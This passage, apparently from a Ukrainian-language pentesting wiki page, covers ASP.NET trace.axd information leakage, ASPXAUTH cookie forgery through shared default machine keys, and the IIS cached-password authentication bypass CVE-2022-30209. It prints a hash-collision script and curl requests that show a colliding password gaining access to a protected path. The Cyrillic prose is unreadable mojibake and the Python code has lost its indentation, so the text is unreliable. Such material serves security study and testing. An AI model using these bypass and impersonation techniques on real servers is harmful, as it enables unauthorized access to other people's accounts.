–¶—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –≤–∫–ª—é—á–∞—î IP-–∞–¥—Ä–µ—Å–∏ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –∫–ª—ñ—î–Ω—Ç—ñ–≤, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ —Å–µ—Å—ñ–π, —É—Å—ñ –∫—É–∫–∏ –∑–∞–ø–∏—Ç—ñ–≤ —ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π, —Ñ—ñ–∑–∏—á–Ω—ñ —à–ª—è—Ö–∏, —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ —ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–∞–≤—ñ—Ç—å —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —ñ –ø–∞—Ä–æ–ª—ñ.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ç–∞–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:

* **`validationKey`** (—Ä—è–¥–æ–∫): –∫–ª—é—á —É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É –∫–æ–¥—É–≤–∞–Ω–Ω—ñ –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É.
* **`decryptionMethod`** (—Ä—è–¥–æ–∫): (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º ‚ÄúAES‚Äù).
* **`decryptionIV`** (—Ä—è–¥–æ–∫): –≤–µ–∫—Ç–æ—Ä —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó —É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É –∫–æ–¥—É–≤–∞–Ω–Ω—ñ (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–µ–∫—Ç–æ—Ä –Ω—É–ª—ñ–≤).
* **`decryptionKey`** (—Ä—è–¥–æ–∫): –∫–ª—é—á —É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É –∫–æ–¥—É–≤–∞–Ω–Ω—ñ –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è.

–û–¥–Ω–∞–∫ –¥–µ—è–∫—ñ –ª—é–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å **–∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º** —Ü–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —è–∫ **–∫—É–∫—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤–µ–±-—Å–∞–π—Ç, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **—Ç—É –∂ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É**, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫—É–∫—É ASPXAUTH, —ñ –≤–∏ **—Å—Ç–≤–æ—Ä–∏—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—é –ø–æ—à—Ç–æ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–æ–≥–æ —Ö–æ—á–µ—Ç–µ –≤–∏–¥–∞—Ç–∏** –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –ø—ñ–¥ –∞—Ç–∞–∫–æ—é, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –∫—É–∫—É –∑ –¥—Ä—É–≥–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ –ø–µ—Ä—à–æ–º—É** —ñ –≤–∏–¥–∞—Ç–∏ —Å–µ–±–µ –∑–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.\
–¶–µ–π –Ω–∞–ø–∞–¥ —Å–ø—Ä–∞—Ü—é–≤–∞–≤ —É —Ü—å–æ–º—É [**–æ–ø–∏—Å—ñ**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## –û–±—Ö—ñ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó IIS –∑ –∫–µ—à–æ–≤–∞–Ω–∏–º–∏ –ø–∞—Ä–æ–ª—è–º–∏ (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[–ü–æ–≤–Ω–∏–π –∑–≤—ñ—Ç —Ç—É—Ç](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): –ü–æ–º–∏–ª–∫–∞ –≤ –∫–æ–¥—ñ **–Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è–ª–∞ –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º –ø–∞—Ä–æ–ª—å, –Ω–∞–¥–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, —Ç–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, —á–∏–π **—Ö–µ—à –ø–∞—Ä–æ–ª—è –ø–æ—Ç—Ä–∞–ø–ª—è—î –≤ –∫–ª—é—á**, —è–∫–∏–π –≤–∂–µ —î –≤ **–∫–µ—à—ñ**, –∑–º–æ–∂–µ —É–≤—ñ–π—Ç–∏ —è–∫ —Ü–µ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
